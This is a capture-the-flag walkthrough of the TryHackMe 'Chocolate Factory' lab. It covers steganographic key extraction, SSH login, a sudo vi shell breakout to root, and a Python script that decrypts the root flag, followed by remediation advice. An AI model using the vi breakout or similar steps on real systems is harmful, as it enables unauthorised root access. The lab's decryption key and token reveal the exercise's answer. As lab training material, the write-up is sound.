# Penetration Testing & Walkthrough Report: Chocolate Factory

**Target Name:** Chocolate Factory

**Platform:** TryHackMe

**Difficulty:** Easy

**Author:** Security Analyst

**Category:** Web Exploitation / Cryptography / Linux Privilege Escalation

---

## Executive Summary

The **Chocolate Factory** machine on TryHackMe is an entry-to-intermediate level Linux target designed to test web assessment, cryptographic decoding, steganography, and Linux privilege escalation vectors.

The compromise involved discovering an exposed web shell, extracting SSH private keys via hidden image metadata, leveraging `vi` binary permissions to achieve root execution, and resolving Python environment constraints to decrypt the final system flag.

---

## Technical Overview & Attack Chain

```
[ Enumeration ] ➔ [ Initial Access ] ➔ [ Privilege Escalation ] ➔ [ Root Flag Decryption ]
  - Nmap Scan       - RSA Key (teleport)   - Sudo /usr/bin/vi        - Cryptography/Fernet
  - Web Appraisal   - SSH as 'charlie'     - Root Shell Spawn        - Python Scripting

```

---

## Detailed Assessment Walkthrough

### Phase 1: Reconnaissance & Enumeration

Initial port scanning revealed multiple open services, including HTTP (Port 80) and SSH (Port 22).

1. **Web Application Assessment:**
* Navigating to the web server presented a custom portal.
* Further web enumeration revealed an input form operating as an unauthenticated command execution endpoint (web shell).


2. **Steganography & Key Recovery:**
* Inspecting hosted web assets brought up an image named `gum_room.jpg`.
* Running `steghide` on `gum_room.jpg` with a blank passphrase extracted an embedded file containing a Base64-encoded string:
```bash
steghide extract -sf gum_room.jpg -p ""

```


* Decoding the string revealed the `teleport` file—an RSA private key for the user `charlie`.



---

### Phase 2: Initial Access

Using the extracted RSA key, SSH access was established as user `charlie`:

1. **Set Key File Permissions:**
```bash
chmod 600 id_rsa

```


2. **Establish SSH Session:**
```bash
ssh -i id_rsa charlie@<TARGET_IP>

```


3. **User Flag Retrieval:**
```bash
cat /home/charlie/user.txt

```



---

### Phase 3: Privilege Escalation

Once authenticated as `charlie`, local enumeration was conducted to identify privilege escalation vectors.

1. **Sudo Enumeration:**
```bash
sudo -l

```


* **Result:** User `charlie` had execution rights to run `/usr/bin/vi` as `root` without a password.


2. **Binary Exploitation via `vi`:**
By invoking `vi` with `sudo` and issuing a shell breakout command, an interactive root shell was spawned:
```bash
sudo vi -c ':!/bin/bash' /dev/null

```


* **Verification:** `id` confirmed `uid=0(root)`.



---

### Phase 4: Flag Decryption & Root Finalization

Navigating to `/root` revealed `root.py` and an embedded encrypted payload. Decrypting the payload required addressing key formatting, data type mismatched exceptions, and environment dependency errors.

1. **Cryptographic Elements Extracted:**
* **Fernet Base64 Key:** `-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=`
* **Encrypted Token:** `gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ`


2. **Technical Challenges Encountered:**
* **Type Misalignment:** Python's `Fernet.decrypt()` requires a `bytes` object (`b'...'`), whereas the original script used a standard `str`.
* **Broken Dependencies:** The local environment's `pyfiglet` library threw an `AttributeError`.


3. **Execution Solution:**
To bypass library dependency failures and handle data types cleanly, a clean Python script was executed directly in memory:
```python
from cryptography.fernet import Fernet

key = b"-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY="
f = Fernet(key)

encrypted_mess = b"gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ"

print("[+] Decrypted Root Flag:", f.decrypt(encrypted_mess).decode())

```



---

## Key Takeaways & Remediation Recommendations

| Vulnerability | Security Risk | Remediation Strategy |
| --- | --- | --- |
| **Command Injection in Web Portal** | Critical | Sanitize input parameters; avoid system call functions (`system`, `exec`). |
| **Hardcoded RSA Keys in Assets** | High | Never store private key material or secrets in public web directories. |
| **Over-permissive Sudo (`vi`)** | High | Restrict Sudo privileges; apply the Principle of Least Privilege (PoLP). |
| **Weak Password / Storage Policies** | Medium | Enforce strong password complexity and secure hash algorithms for user accounts. |

---
